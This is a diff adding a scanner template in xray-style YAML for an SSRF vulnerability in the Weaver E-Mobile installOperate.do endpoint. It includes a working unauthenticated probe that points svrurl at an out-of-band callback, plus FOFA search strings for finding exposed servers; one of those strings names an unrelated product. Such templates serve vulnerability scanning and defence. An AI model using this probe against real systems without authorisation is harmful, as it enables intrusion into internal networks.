@@ -1,0 +1,25 @@
+id: E-Mobile-installOperate.do-SSRF
+
+info:
+  name: 泛微E-Mobile installOperate.do SSRF漏洞
+  author: avic123
+  severity: HIGH
+  verified: true
+  description: |
+    某微E-Mobile installOperate.do 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露  fofa：title="Aviatrix Controller"
+    FOFA：header="EMobileServer"
+  reference:
+    - https://cn-sec.com/archives/2999851.html
+  tags: 泛微,Mobile,SSRF
+  created: 2025/1/22
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+rules:
+  r0:
+    request:
+      method: GET
+      path: /install/installOperate.do?svrurl={{oobHTTP}}
+    expression: response.status == 302 && oobCheck(oob, oob.ProtocolHTTP, 3)
+expression: r0()
